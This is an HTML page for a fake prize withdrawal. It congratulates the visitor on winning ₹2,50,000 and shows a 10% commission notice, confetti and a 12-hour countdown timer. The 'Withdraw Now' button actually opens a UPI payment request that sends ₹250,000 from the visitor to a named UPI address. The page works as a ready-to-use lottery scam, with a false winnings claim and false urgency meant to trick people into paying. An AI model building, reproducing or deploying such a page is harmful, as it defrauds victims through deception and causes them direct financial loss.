<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Withdraw</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #111;
      color: #fff;
      text-align: center;
      padding: 30px;
    }
    .amount {
      font-size: 2.5em;
      color: gold;
    }
    .note {
      margin-top: 10px;
      font-size: 1em;
      color: #ccc;
    }
    #countdown {
      margin-top: 20px;
      font-size: 1.5em;
      color: #ff4444;
    }
    .btn {
      margin-top: 30px;
      padding: 15px 30px;
      background: green;
      color: white;
      font-size: 1.2em;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
    .expired {
      color: red;
      font-size: 1.5em;
      margin-top: 40px;
    }
  </style>
</head>
<body>
  <h1>Congratulations!</h1>
  <div class="amount">â‚¹2,50,000</div>
  <div class="note">Note: 10% commission will be deducted on withdrawal.</div>

  <div id="countdown"></div>
  <div id="actionArea">
    <button class="btn" onclick="window.location.href='upi://pay?pa=ramchoudhary2315@ybl&am=250000&cu=INR'">Withdraw Now</button>
  </div>

  <!-- Celebration Sound -->
  <audio id="celebrationSound" autoplay>
    <source src="sounds/celebrate.mp3" type="audio/mpeg">
  </audio>

  <!-- Confetti JS -->
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
  <script>
    // Fire confetti
    confetti({
      particleCount: 200,
      spread: 70,
      origin: { y: 0.6 }
    });

    // Stop audio after 3 sec
    setTimeout(() => {
      document.getElementById('celebrationSound').pause();
    }, 3000);

    // 12 hour countdown logic
    const countdownEl = document.getElementById('countdown');
    const actionArea = document.getElementById('actionArea');

    const firstVisitKey = 'withdrawalFirstVisitTime3';
    let startTime = localStorage.getItem(firstVisitKey);

    if (!startTime) {
      startTime = new Date().getTime();
      localStorage.setItem(firstVisitKey, startTime);
    } else {
      startTime = parseInt(startTime);
    }

    const expirationTime = startTime + 12 * 60 * 60 * 1000;

    function updateCountdown() {
      const now = new Date().getTime();
      const distance = expirationTime - now;

      if (distance <= 0) {
        countdownEl.innerHTML = "<div class='expired'>Link Expired</div>";
        actionArea.innerHTML = "";
        return;
      }

      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((distance % (1000 * 60)) / 1000);

      countdownEl.innerHTML = `Link valid for: ${hours}h ${minutes}m ${seconds}s`;
    }

    updateCountdown();
    setInterval(updateCountdown, 1000);
  </script>
</body>
</html>
